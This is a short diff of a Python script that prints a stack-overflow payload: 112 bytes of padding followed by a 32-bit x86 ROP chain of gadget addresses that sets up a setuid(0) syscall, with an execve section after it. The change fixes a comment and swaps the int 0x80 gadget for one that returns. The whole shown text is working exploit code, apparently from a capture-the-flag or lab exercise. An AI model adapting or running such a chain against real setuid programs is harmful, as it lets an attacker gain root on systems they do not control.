@@ -1,7 +1,7 @@
 import sys
 sys.stdout.buffer.write(b'A'*112)
 
-# setuid
+# setuid(0)
 sys.stdout.buffer.write(0x080481d1.to_bytes(4,'little')) # pop ebx ; ret
 sys.stdout.buffer.write(0xffffffff.to_bytes(4,'little')) # data
 sys.stdout.buffer.write(0x0805e27b.to_bytes(4,'little')) # inc ebx ; ret
@@ -29,7 +29,7 @@ sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
 sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
 sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
 sys.stdout.buffer.write(0x0805e8ad.to_bytes(4,'little')) # inc eax ; ret
-sys.stdout.buffer.write(0x08049893.to_bytes(4,'little')) # int 0x80
+sys.stdout.buffer.write(0x080732d0.to_bytes(4,'little')) # int 0x80 ; ret
 
 
 # execve
